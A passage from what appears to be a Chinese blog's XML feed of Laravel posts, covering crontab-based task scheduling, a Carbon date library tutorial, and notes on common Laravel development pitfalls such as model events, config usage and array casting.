2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>这里为了测试定时任务的执行，先设置每分钟进行观察。</p><p><code>/dev/null 2&gt;&amp;1</code> 分为两部分进行理解：</p><ol><li><code>/dev/null</code>是系统黑洞，也就是 <code>&gt;&gt;</code> 之前执行的输出信息会全部丢进这个黑洞中</li><li>在标准输出中，<code>stdin</code> 是 0，<code>stdout</code> 是 1，<code>stderr</code> 是 2，所以它将 <code>stderr</code> 全部导到 <code>stdout</code>，<code>stdout</code>又被导回 <code>/dev/null</code>，也就是不输出</li></ol><p>所以，这两段加起来的结果就是 <code>crontab</code> 的执行不会有任何输出。</p><p>但调试阶段，还是建议先输出到一个已知文件，这样好确定定时任务是否有正常执行（如果任务执行异常，会看到异常信息）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * php /your_project_absolute_path schedule:run &gt;&gt; /tmp/crontab.log</span><br></pre></td></tr></table></figure><p>系统的定时任务已经设定好了，现在 crontab 将会每分钟调用一次 Laravel 命令调度器，当 <code>schedule:run</code> 命令执行时， Laravel 会评估你的计划任务并运行预定任务。</p><h2 id="任务调度"><a href="#任务调度" class="headerlink" title="任务调度"></a>任务调度</h2><p>最后我们注册Laravel 调度任务即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/Console/Kernel.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kernel</span> <span class="keyword">extends</span> <span class="title">ConsoleKernel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">schedule</span><span class="params">(Schedule $schedule)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 每分钟执行一次『数据清理』（进行调试）</span></span><br><span class="line">        $schedule-&gt;command(<span class="string">'system:data-cleaning'</span>)-&gt;everyMinute();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// daily 每天执行一次『数据清理』</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试时，仍使用一分钟，如果运行正常，之后将<code>everyMinute</code> 替换成 <code>daily</code> 即可。</p><p>做完以上操作之后，只需要等待一分钟，然后查看 <code>/tmp/crontab.log</code> 日志文件，是否有输出，如果能看到以下输出，则表示任务调度正常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2021-07-04T20:30:01+08:00] Running scheduled command: &#39;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;php@7.4&#x2F;7.4.20&#x2F;bin&#x2F;php&#39; &#39;artisan&#39; system:data-cleaning &gt; &#39;&#x2F;dev&#x2F;null&#39; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>Laravel 的任务调度，使得执行定时任务变得非常方便。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Carbon 快速上手</title>
      <link href="/laravel-carbon-quick-start/"/>
      <url>/laravel-carbon-quick-start/</url>
      
        <content type="html"><![CDATA[<p>在使用PHP 开发时，免不了经常需要处理日期和时间，这使得我们不得不面临各种格式化、日期/时间计算等问题。</p><p>幸运的是，一些勤劳的人已经帮我们完成了辛苦的工作，使得在PHP 开发中处理日期/时间变得更加简单、更语义化。</p><a id="more"></a><h2 id="Carbon"><a href="#Carbon" class="headerlink" title="Carbon"></a>Carbon</h2><p><a href="https://github.com/briannesbitt/Carbon" target="_blank" rel="noopener">Carbon</a> 是由 <a href="https://github.com/briannesbitt" target="_blank" rel="noopener">Brian Nesbit</a> 开发的一个包，它扩展了 PHP 自己的 DateTime 类。</p><p>它提供了一些很好的功能来处理 PHP 中的日期/时间，诸如：</p><ul><li>处理时区</li><li>日期解析</li><li>日期操作</li><li>日期比较</li><li>日期语义化</li><li>日期格式化</li><li>等</li></ul><p>安装：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="keyword">require</span> nesbot/carbon</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Carbon</span>\<span class="title">Carbon</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Carbon::now();  <span class="comment">// 2021-07-03 16:02:17</span></span><br></pre></td></tr></table></figure><p>注意：因为Laravel 已默认安装了此包，所以无需再次执行上面的命令。</p><h2 id="获取特定日期-时间"><a href="#获取特定日期-时间" class="headerlink" title="获取特定日期/时间"></a>获取特定日期/时间</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前时间 - 2021-07-03 16:03:46</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::now();   <span class="comment">// Object</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> Carbon();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取今天 - 2021-07-03 00:00:00</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::today();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取昨天 - 2021-07-02 00:00:00</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::yesterday();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取明天 - 2021-12-04 00:00:00</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::tomorrow();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析特定字符串 - 2021-01-01 00:00:00</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> Carbon(<span class="string">'first day of January 2021'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设定一个特定的时区 - 2021-01-01 00:00:00</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> Carbon(<span class="string">'first day of January 2021'</span>, <span class="string">'Asia/Tokyo'</span>);</span><br></pre></td></tr></table></figure><p>默认情况下，<code>Carbon</code> 的方法返回的为一个日期时间对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Carbon &#123;<span class="comment">#179 ▼</span></span><br><span class="line">  +<span class="string">"date"</span>: <span class="string">"2021-07-03 00:00:00.000000"</span></span><br><span class="line">  +<span class="string">"timezone_type"</span>: <span class="number">3</span></span><br><span class="line">  +<span class="string">"timezone"</span>: <span class="string">"UTC"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然它是一个对象，但是却可以直接使用 <code>echo</code> 输出结果，因为有 <code>__toString</code>魔术方法。</p><h2 id="日期格式化"><a href="#日期格式化" class="headerlink" title="日期格式化"></a>日期格式化</h2><p>如果你想把它转为字符串，可以使用 <code>toDateString</code> 或 <code>toDateTimeString</code>等方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$dt = Carbon::now();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;toDateString();               <span class="comment">// 2021-07-03</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;toFormattedDateString();      <span class="comment">// Jul 3, 2021</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;toTimeString();               <span class="comment">// 16:40:01</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;toDateTimeString();           <span class="comment">// 2021-07-03 16:40:01</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;toDayDateTimeString();        <span class="comment">// Sat, Jul 3, 2021 4:40 PM</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;format(<span class="string">'Y.m.d'</span>);              <span class="comment">// 2021.07.03</span></span><br></pre></td></tr></table></figure><h2 id="日期解析"><a href="#日期解析" class="headerlink" title="日期解析"></a>日期解析</h2><p>可以使用 <code>parse</code> 方法解析任何顺序和类型的日期。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">"2021-07-03 16:20:44"</span>);</span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">"2021-07-03 16:20:44"</span>)-&gt;toDateString();</span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">"2021-07-03 16:20:44"</span>)-&gt;toDateTimeString();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'now'</span>);        <span class="comment">// 2021-07-03 16:24:01</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'today'</span>);      <span class="comment">// 2021-07-03 00:00:00</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'yesterday'</span>);  <span class="comment">// 2021-07-02 00:00:00</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'tomorrow'</span>);   <span class="comment">// 2021-07-04 00:00:00</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'2 days ago'</span>); <span class="comment">// 2021-07-01 16:25:55 </span></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'+3 days'</span>);    <span class="comment">// 2021-07-06 16:25:55</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'+3 weeks'</span>);   <span class="comment">// 2021-07-24 16:25:55</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::parse(<span class="string">'+1 months'</span>);  <span class="comment">// 2021-08-03 16:25:55</span></span><br></pre></td></tr></table></figure><p>返回结果仍是 <code>Carbon</code> 类型的日期时间对象。</p><h2 id="日期-时间操作"><a href="#日期-时间操作" class="headerlink" title="日期/时间操作"></a>日期/时间操作</h2><p>如何获取日期，并不是唯一需要做的事情，经常需要做的事情应该是操作日期或时间。</p><p>例如：计算一个日期加上N 天之后，是什么时间; 两个月后的今天是什么时间; 当前时间的三个小时之后是什么时间; 诸如此类。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;addDays(<span class="number">25</span>);        <span class="comment">// 2021-07-28 16:31:03</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;addWeeks(<span class="number">3</span>);        <span class="comment">// 2021-07-24 16:31:03</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;addHours(<span class="number">25</span>);       <span class="comment">// 2021-07-04 17:31:03</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;subHours(<span class="number">2</span>);        <span class="comment">// 2021-07-03 14:31:03  </span></span><br><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;addHours(<span class="number">2</span>)-&gt;addMinutes(<span class="number">12</span>; <span class="comment">// 2021-07-03 18:43:03</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;modify(<span class="string">'+15 days'</span>); <span class="comment">// 2021-07-18 16:31:03</span></span><br><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;modify(<span class="string">'-2 days'</span>);  <span class="comment">// 2021-07-01 16:31:03</span></span><br></pre></td></tr></table></figure><h2 id="日期比较"><a href="#日期比较" class="headerlink" title="日期比较"></a>日期比较</h2><p>在 Carbon 中你可以使用下面的方法来比较日期：</p><ul><li><code>min</code> –返回最小日期。</li><li><code>max</code> – 返回最大日期。</li><li><code>eq</code> – 判断两个日期是否相等。</li><li><code>gt</code> – 判断第一个日期是否比第二个日期大。</li><li><code>lt</code> – 判断第一个日期是否比第二个日期小。</li><li><code>gte</code> – 判断第一个日期是否大于等于第二个日期。</li><li><code>lte</code> – 判断第一个日期是否小于等于第二个日期。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$now = Carbon::now();</span><br><span class="line">$yesterday = Carbon::yesterday();</span><br><span class="line"></span><br><span class="line">var_dump($now-&gt;eq($yesterday));     <span class="comment">// bool(false)</span></span><br><span class="line">var_dump($now-&gt;gt($yesterday));     <span class="comment">// bool(true)</span></span><br><span class="line">var_dump($now-&gt;lt($yesterday));     <span class="comment">// bool(false)</span></span><br></pre></td></tr></table></figure><h2 id="语义化"><a href="#语义化" class="headerlink" title="语义化"></a>语义化</h2><p>相对时间语义化变得越来越流行，通常可以在各种社交、通讯应用上看到。</p><p>例如，将时间显示为 3 小时前 比显示 上午 8:12，更适合人类阅读。</p><p>这些方法被用于计算时间差，并转换为人类可阅读的格式，有如下四种表达时间差的方式：</p><ul><li>将一个过去的时间和现在做比较：<ul><li>1 小时前</li><li>5 个月前</li></ul></li><li>将一个未来的时间和现在做比较：<ul><li>1 小时后</li><li>5 个月后</li></ul></li><li>将一个过去的时间和另一个时间做比较：<ul><li>1 小时前</li><li>5 小时前</li></ul></li><li>将一个未来的时间和另一个做比较：<ul><li>1 小时后</li><li>5 小时后</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$dt = Carbon::now();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;subDays(<span class="number">10</span>)-&gt;diffForHumans();   <span class="comment">// 1 week ago</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;addHours(<span class="number">12</span>)-&gt;diffForHumans();  <span class="comment">// 1 week ago</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;subMonth()-&gt;diffForHumans();    <span class="comment">// 1 month ago</span></span><br></pre></td></tr></table></figure><h2 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h2><p>上面最后一个例子，可以看到，Carbon 默认输出的不是中文，可以增加以下代码设置本地化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\Carbon\Carbon::setLocale(<span class="string">'zh'</span>);</span><br><span class="line"></span><br><span class="line">$dt = Carbon::now();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;subDays(<span class="number">10</span>)-&gt;diffForHumans();   <span class="comment">// 1周前</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;addHours(<span class="number">12</span>)-&gt;diffForHumans();  <span class="comment">// 1周前</span></span><br><span class="line"><span class="keyword">echo</span> $dt-&gt;subMonth()-&gt;diffForHumans();    <span class="comment">// 1个月前</span></span><br></pre></td></tr></table></figure><p>Carbon 能做的远远不止这些，这里只是列举了一些个人常用的方法，关于更多Carbon 的用法，请查看<a href="https://carbon.nesbot.com" target="_blank" rel="noopener">官方文档</a>。</p><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>下面整理一些常见的使用场景。</p><p>获取某个时刻的起始时间和结束时间：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取一天的开始时间和结束时间</span></span><br><span class="line">now()-&gt;startOfDay();      <span class="comment">// 2021-08-12 00:00:00</span></span><br><span class="line">now()-&gt;endOfDay();        <span class="comment">// 2021-08-12 23:59:59</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取这周的开始时间和结束时间</span></span><br><span class="line">now()-&gt;startOfWeek();     <span class="comment">// 2021-08-09 00:00:00</span></span><br><span class="line">now()-&gt;endOfWeek();       <span class="comment">// 2021-08-15 23:59:59</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取这个月的起始时间和结束时间</span></span><br><span class="line">now()-&gt;startOfMonth();    <span class="comment">// 2021-08-01 00:00:00</span></span><br><span class="line">now()-&gt;endOfMonth();      <span class="comment">// 2021-08-31 23:59:59</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取今年的起始时间和结束时间</span></span><br><span class="line">now()-&gt;startOfYear();     <span class="comment">// 2021-01-01 00:00:00</span></span><br><span class="line">now()-&gt;endOfYear();       <span class="comment">// 2021-12-31 23:59:59</span></span><br></pre></td></tr></table></figure><p>获取指定日期范围内的日期：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$startTime = now();</span><br><span class="line">$endTime = Carbon::parse(<span class="string">"2021-09-12"</span>);</span><br><span class="line">$dates = $startTime-&gt;daysUntil($endTime);</span><br><span class="line"><span class="comment">// 返回结果包含每一天的日期的对象</span></span><br></pre></td></tr></table></figure><p>格式化日期为指定格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">now()-&gt;format(<span class="string">"Y/m/d"</span>);   <span class="comment">// 2021/08/12</span></span><br><span class="line">now()-&gt;format(<span class="string">"Y.m.d"</span>);   <span class="comment">// 2021.08.12</span></span><br></pre></td></tr></table></figure><p>判断日期是否为指定格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Carbon::hasFormat(<span class="string">"2021/08/12"</span>, <span class="string">"Y-m-d"</span>)  <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>语义化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Carbon::parse(<span class="string">"2021-08-29 14:57:32"</span>)-&gt;diffForHumans(now());</span><br><span class="line"><span class="comment">// 一分钟前</span></span><br></pre></td></tr></table></figure><p>转化为天小时分钟：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CarbonInterval::seconds(<span class="number">384</span>)-&gt;cascade()-&gt;forHumans();</span><br><span class="line"><span class="comment">// 6分钟24秒</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.heibaiketang.com/forum/show/141.html" target="_blank" rel="noopener">Laravel 中日期时间 Carbon 包的的使用详解</a></li><li><a href="https://carbon.nesbot.com/docs/" target="_blank" rel="noopener">Carbon Api Doc</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录 Laravel 开发中一些有意义的问题</title>
      <link href="/record-some-meaningful-issues-in-laravel-development/"/>
      <url>/record-some-meaningful-issues-in-laravel-development/</url>
      
        <content type="html"><![CDATA[<p>如题。</p><a id="more"></a><h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h2><p>为什么不要在生产环境使用 <code>composer update</code>？</p><p>其实这个问题和Laravel 并没有直接关系。</p><p>永远不要在生产环境上直接运行 <code>compser update</code>，因为它很慢并且会破坏版本库。</p><p>正确的做法应该是，始终在本地开发环境下使用 <code>composer update</code>，并将新的<code>composer.lock</code> 提交到版本库，生产环境中则需要运行 <code>composer install</code> 即可。</p><h2 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h2><p>为什么这段代码永远都进不到 『用户注册失败』中？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($user)&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'用户注册成功'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">'用户注册失败'</span>;</span><br></pre></td></tr></table></figure><p>因为Laravel 的大部分操作，基本都是以异常形式处理，所以不需要 <code>if...else</code>。<a href="https://learnku.com/articles/25947#reply84579" target="_blank" rel="noopener">原文链接</a>。</p><h2 id="问题三"><a href="#问题三" class="headerlink" title="问题三"></a>问题三</h2><p>具体哪些操作会触发模型事件？</p><p>实例一：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$user = <span class="keyword">new</span> User / find / first / all()-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $user not exits; triggering event: creating、created、saving、saved</span></span><br><span class="line"><span class="comment">// $user exits; triggering event: updating、updated、saving、saved</span></span><br><span class="line">$user-&gt;save(); </span><br><span class="line"></span><br><span class="line">$user-&gt;create();</span><br><span class="line">$user-&gt;update();</span><br><span class="line">$user-&gt;delete();</span><br></pre></td></tr></table></figure><p>触发模型事件有一个很显著的特征就是：一定会存在模型实例。</p><p>实例二：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User::where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;update([<span class="string">'name'</span>, <span class="string">'eienao'</span>]);</span><br></pre></td></tr></table></figure><p>上面这个例子，就不会触发模型事件，因为始终都没有一个模型实例参与。</p><p>实例三：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = User::first();</span><br><span class="line">$user-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;update([<span class="string">'name'</span>, <span class="string">'eienao'</span>]);</span><br></pre></td></tr></table></figure><p>这个例子看起来可能会比较迷惑，但实际上最终也不会触发模型事件，因为 <code>where()</code> 方法返回的是一个『查询构造器』。</p><p>模型实例此时已经不参与其中了，其只是做一个引导出查询构造器的作用。</p><h2 id="问题四"><a href="#问题四" class="headerlink" title="问题四"></a>问题四</h2><p>不要直接从 <code>.env</code> 文件中获取数据。</p><p>更好地做法应该是将数据放入配置文件，然后使用助手函数<code>config()</code> 去获取数据。</p><p>坏：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$apiKey = env(<span class="string">'API_KEY'</span>);</span><br></pre></td></tr></table></figure><p>好：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config/api.php</span></span><br><span class="line"><span class="string">'key'</span> =&gt; env(<span class="string">'API_KEY'</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use the data</span></span><br><span class="line">$apiKey = config(<span class="string">'api.key'</span>);</span><br></pre></td></tr></table></figure><blockquote><p>你可能会疑惑，为什么要这么做呢？最后不还是要从 <code>.env</code> 中获取数据。 </p></blockquote><p>这是因为尽量不要修改业务代码，如遇变化要么修改<code>config</code>，要么修改<code>.env</code>，而<code>config</code> 的代码是纳入评审的，修改起来更方便，所以应该用<code>config</code> 代理<code>.env</code>, 能减少对<code>.env</code> 的修改。</p><h2 id="问题五"><a href="#问题五" class="headerlink" title="问题五"></a>问题五</h2><p>Laravel 好像自从<code>7.x</code> 版本开始，为了格式化日期以进行序列化，框架使用了新的日期序列化格式——Carbon 的 <code>toJSON</code> 方法。</p><p>使用新格式序列化的日期将显示为：<code>2021-07-11 20:01:002019-12-02T20:01:00.283041Z</code>，眼熟不，这个格式。</p><p>如果还想使用正常的<code>年-月-日 时:分:秒</code> 格式，则可以在模型上覆盖 <code>serializeDate</code> 方法即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">DateTimeInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Prepare a date for array / JSON serialization.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  \DateTimeInterface  $date</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serializeDate</span><span class="params">(DateTimeInterface $date)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $date-&gt;format(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题六"><a href="#问题六" class="headerlink" title="问题六"></a>问题六</h2><p>在Laravel Model 中，将某个属性设置为<code>array casting</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $casts = [</span><br><span class="line">    <span class="string">'options'</span> =&gt; <span class="string">'array'</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>这时如果再想对其值进行修改，就会引发异常：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data-&gt;options[<span class="string">"key"</span>] = <span class="string">"value"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// production.ERROR: Indirect modification of overloaded property</span></span><br></pre></td></tr></table></figure><p>可见，<code>casting</code> 并不支持一些针对特定类型的操作，例如无法作为指定类型的函数的参数。</p><p>按照官方文档的做法，应该是先赋值给一个中间变量，进行操作，然后再赋值回去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$user = App\User::find(<span class="number">1</span>);</span><br><span class="line">$options = $user-&gt;options;</span><br><span class="line">$options[<span class="string">'key'</span>] = <span class="string">'value'</span>;</span><br><span class="line">$user-&gt;options = $options;</span><br><span class="line">$user-&gt;save();</span><br></pre></td></tr></table></figure><h2 id="问题七"><a href="#问题七" class="headerlink" title="问题七"></a>问题七</h2><p><code>queue:listen</code> 与 <code>queue:work</code> 有什么区别？</p><p>这是一个关于队列的问题，前者与后者的区别在于，当上下文环境发生变化，前者会自动重新加载新的上下文，而后者则不会。</p><p>自Laravel <code>5.x</code> 版本以来，官方文档中已不再介绍<code>queue:listen</code> 指令怎么使用了，所以开发阶段建议使用 <code>queue:listen</code> 进行调试，其余情况建议全部使用 <code>queue:work</code>，因为效率更高。</p><h2 id="问题八"><a href="#问题八" class="headerlink" title="问题八"></a>问题八</h2><p>Laravel 如何在关联模型中排序？</p><p>答案是：对于跨表排序这种需求，模型关联默认是没有实现的，因为模型关联的原理是将SQL 拆分成两条，模型关联的结果集是基于前面一条SQL 返回的id 